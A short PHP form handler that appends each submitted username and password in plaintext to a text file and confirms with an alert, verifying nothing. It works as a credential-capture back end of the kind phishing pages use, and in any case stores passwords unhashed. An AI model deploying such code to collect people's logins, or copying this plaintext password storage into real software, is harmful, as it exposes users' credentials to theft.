<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['userInput'] ?? '';
    $password = $_POST['password'] ?? '';

    // Sanitize inputs
    $username = htmlspecialchars(trim($username), ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars(trim($password), ENT_QUOTES, 'UTF-8');

    // Validate inputs
    if (!empty($username) && !empty($password)) {
        $file = '/home/tariq/web/logininfo.txt';

        // Ensure the file exists or create it
        if (!file_exists($file)) {
            if (!touch($file)) {
                error_log("Failed to create $file");
                echo "An error occurred while processing your request.";
                exit;
            }
        }

        // Save login info to logininfo.txt
        $data = "Username: $username, Password: $password\n";
        if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
            echo "<script>alert('Login information saved successfully.');</script>";
        } else {
            error_log("Failed to write to $file");
            echo "<script>alert('An error occurred while saving your information.');</script>";
        }
    } else {
        echo "<script>alert('Username and password cannot be empty.');</script>";
    }
}
?>
